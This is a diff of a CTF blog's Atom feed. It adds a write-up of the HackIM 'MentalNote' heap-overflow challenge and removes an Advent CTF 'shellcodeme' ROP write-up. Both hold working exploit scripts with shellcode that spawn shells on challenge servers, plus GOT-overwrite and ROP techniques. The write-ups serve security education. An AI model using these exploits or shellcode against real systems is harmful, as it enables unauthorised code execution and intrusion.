@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-01-11T20:29:46+01:00</updated>
+  <updated>2015-01-11T22:43:49+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,299 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
+    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
+    <updated>2015-01-11T21:40:18+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
+    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>
+
+<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
+You want to store some Notes??
+Well, we present you the Sherlock's MentalPad --&gt;
+Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
+NOTE: It has a limit though
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+</code></pre>
+
+<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>
+
+<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>
+
+<pre><code>You want to store some Notes??
+Well, we present you the Sherlock's MentalPad --&gt;
+Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
+NOTE: It has a limit though
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+1
+Give the type of the Note:
+1
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+1
+Give the type of the Note:
+1
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+3
+Give the Note id to edit:
+0
+Give the type to edit:
+2
+Give your Note:
+AAAA
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+3
+Give the Note id to edit:
+1
+Give the type to edit:
+2
+Give your Note:
+BBBB
+Please enter one of the following option:
+</code></pre>
+
+<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>
+
+<pre><code>gdb-peda$ x/60w 0x804d0c0
+0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
+0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
+0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>
+
+<pre><code class="c">struct note {
+    note *next_note;
+    note *prev_note;
+    char note_content[MAX_LENGTH];
+};
+</code></pre>
+
+<p>I sent a stupidly large input to overflow these notes:</p>
+
+<pre><code>gdb-peda$ r
+You want to store some Notes??
+Well, we present you the Sherlock's MentalPad --&gt;
+Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
+NOTE: It has a limit though
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+1
+Give the type of the Note:
+1
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+1
+Give the type of the Note:
+1
+Please enter one of the following option:
+1 to add a Note.
+2 to delete a Note.
+3 to edit a Note.
+4 to show a Note.
+5 to exit.
+Your Choice:
+3
+Give the Note id to edit:
+0
+Give the type to edit:
+2
+Give your Note:
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
+</code></pre>
+
+<p>The heap for note two now looks like this:</p>
+
+<pre><code>gdb-peda$ x/60wx 0x804d0c0
+0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
+0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
+0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
+0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
+0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>
+
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm  Name
+&lt;snip&gt;
+0x0804c000 0x0804e000 rwxp  [heap]
+</code></pre>
+
+<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>
+
+<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>
+
+<pre><code>gdb-peda$ x/60wx 0x804d0c0
+0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
+0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
+0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
+0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>
+
+<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>
+
+<p>The exploit:</p>
+
+<pre><code class="python">import struct
+import socket
+import time
+import re
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('54.163.248.69', 9004))
+
+s.recv(1000)
+time.sleep(0.5)
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+payload  = "1\n1\n1\n1\n"   # create two notes of type one
+payload += "3\n0\n2\n"      # edit note 0 as type two
+
+s.send(payload)
+time.sleep(0.5)
+
+# overflow note to line up to heap pointer
+s.send("A"*212+"BBB\n")
+
+time.sleep(0.5)
+s.recv(256)
+
+# leak heap addr
+print "[+] Trying to leaking heap address..."
+time.sleep(0.5)
+
+s.send("4\n0\n")
+time.sleep(0.5)
+
+data = s.recv(1000)
+
+# ugly.. but works :/
+m = re.search(r'.*BBB\n(....).*', data)
+if m:
+    heap = struct.unpack('&lt;L', m.group(1))[0]
+    print "[+] Leaked heap address at {}".format(hex(heap))
+    # offset for shellcode found empirically via gdb
+    shellcode = heap - 0xd0
+    print "[+] Shellcode at {}".format(hex(shellcode))
+else:
+    print "[!] Fatal: could not leak heap address"
+    exit(0)
+
+time.sleep(0.5)
+print "[+] Sending new notes to overwrite got pointer..."
+s.send("1\n1\n1\n1\n")  # create two more notes
+time.sleep(0.5)
+s.recv(1000)
+
+# send new note to overflow pointers
+s.send("3\n2\n2\n")
+time.sleep(0.5)
+s.recv(1000)
+
+time.sleep(0.5)
+payload = ""
+sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+# prepend shellcode with a little NOP sled
+payload += "\x90"*(212-len(sc))
+payload += sc
+# overwrite note_info struct
+payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
+payload += p(shellcode)       # heap location of shellcode
+
+payload += "\n"
+s.send(payload)
+
+# request deletion of a note, triggering our write-what-where
+# we overwrite a function pointer in the got with the location
+# of our shellcode
+time.sleep(0.5)
+s.send("2\n3\n")
+
+time.sleep(0.5)
+s.recv(512)
+
+# shell incoming!
+print "[+] Enjoy your shell!"
+
+import telnetlib
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+
+s.close()
+</code></pre>
+
+<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
+[+] Trying to leaking heap address...
+[+] Leaked heap address at 0x85cf1d0
+[+] Shellcode at 0x85cf100
+[+] Sending new notes to overwrite got pointer...
+[+] Enjoy your shell!
+id
+/bin//sh: 1: id: not found
+cat flag.txt
+flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
+</code></pre>
+
+<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[HackIM CTF: Mixme Writeup]]></title>
@@ -980,259 +1273,6 @@ Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
 <p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>
 
 <p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
-    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
-    <updated>2014-12-24T11:37:46+01:00</updated>
-    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
-    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>
-
-<!-- more -->
-
-
-<p></p>
-
-<p>We&rsquo;re given a binary and the C source code:</p>
-
-<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;sys/mman.h&gt;
-
-#define SHELLCODE_LEN 1024
-
-int main(void) {
-    char *buf;
-    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    read(0, &amp;buf, SHELLCODE_LEN);
-    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
-    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
-}
-</code></pre>
-
-<p>The bug was kind of obvious:</p>
-
-<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
-</code></pre>
-
-<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>
-
-<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
-</code></pre>
-
-<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct
-import socket
-import telnetlib
-import time
-
-def p(x):
-        return struct.pack('&lt;L', x)
-
-POP3RET = 0x804855d
-MPROTECT = 0x8048330
-READ = 0x8048340
-
-payload = ""
-payload += p(0x080484fc)        # leave; ret (restore stack)
-payload += "A"*12               # dummy 
-
-payload += p(MPROTECT)          # mprotect shellcode area back to rwx
-payload += p(POP3RET)           # fix stack
-payload += p(0x20000000)        # addr of shellcode
-payload += p(0x1000)            # size (page-aligned)
-payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
-
-payload += p(READ)              # read in our shellcode
-payload += p(POP3RET)           # fix stack
-payload += p(0x0)               # stdin
-payload += p(0x20000000)        # address
-payload += p(1024)              # copied value
-
-payload += p(0x20000000)        # return to shellcode
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('pwnable.katsudon.org', 33201))
-
-# send first stage
-s.send(payload)
-
-# for some reason, this delay was necessary
-time.sleep(0.05)
-
-# send shellcode, spawns /bin/sh
-s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
-
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-</code></pre>
-
-<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>
-
-<pre><code class="bash">root@kali:~# python exploit.py
-id
-uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
-ls -alh
-total 36K
-dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
-drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
--rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
--rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
--rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
--r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
--r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
-cat flag 2&gt;&amp;1
-cat: flag: Permission denied
-</code></pre>
-
-<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>
-
-<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>
-
-<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
-   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
-   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
-   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
-   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
-   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
-   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
-   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
-   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
-</code></pre>
-
-<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>
-
-<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-</code></pre>
-
-<p>Prepare for some mind-bending ROP chains&hellip;</p>
-
-<pre><code class="python">#!/usr/bin/python
-
-import struct
-def p(x):
-    return struct.pack("L", x)
-
-payload = ""
-
-'''
-   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-'''
-
-# first, fix up stack   
-payload += p(0x00400690)    # pop pop ret
-payload += p(0x0)
-payload += p(0x0)
-
-#### MPROTECT
-# gadgets to set edi, esi and edx and call mprotect
-payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
-payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
-payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
-payload += p(0x0)           # r13
-payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
-payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr
-
-payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-payload += "B"*(200-144)    # spacer
-
-#### READ
-# gadgets to set edi, esi and edx and call read
-'''
-   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
-   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
-   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
-   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
-   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
-'''
-# 0x601020 &lt;read@got.plt&gt;
-payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
-payload += p(0x400)         # rbp -&gt; edx = 0x400
-payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
-payload += p(0x0)           # r13 
-payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
-payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
-                            # lucky for me, rax = 0
-payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
-payload += "B"*(200-144)    # spacer
-
-# return to shellcode!
-payload += p(0x20000000)
-
-print payload
-</code></pre>
-
-<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>
-
-<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
-   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
-   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
-   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
-   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
-   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
-   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
-   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
-   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
-   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
-   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
-   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
-   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
-   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
-   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
-</code></pre>
-
-<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>
-
-<p>The problem arises after returning from the mprotect call:</p>
-
-<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
-   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
-   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
-</code></pre>
-
-<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>
-
-<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>
-
-<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>
-
-<pre><code class="python">shellcode = payload.encode('hex')
-
-output = ""
-
-for i in range(len(shellcode)/2):
-    output += "\\x" +shellcode[i*2:i*2+2]
-
-print output
-</code></pre>
-
-<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>
-
-<pre><code>xor byte [rdi + 11], 0x41
---&gt;
-xor byte [rdi + 4], 0x41
-</code></pre>
-
-<p>And <strong>finally</strong>, starting from the first binary:</p>
-
-<pre><code class="bash">root@kali:~# python exploit.py
-id
-uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
-(perl -e 'print "\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00"'; perl -e 'print "\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41"') | ./shellcodeme2
-ADCTF_I_l0v3_tH15_4W350M3_m15T4K
-</code></pre>
-
-<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
 ]]></content>
   </entry>
   
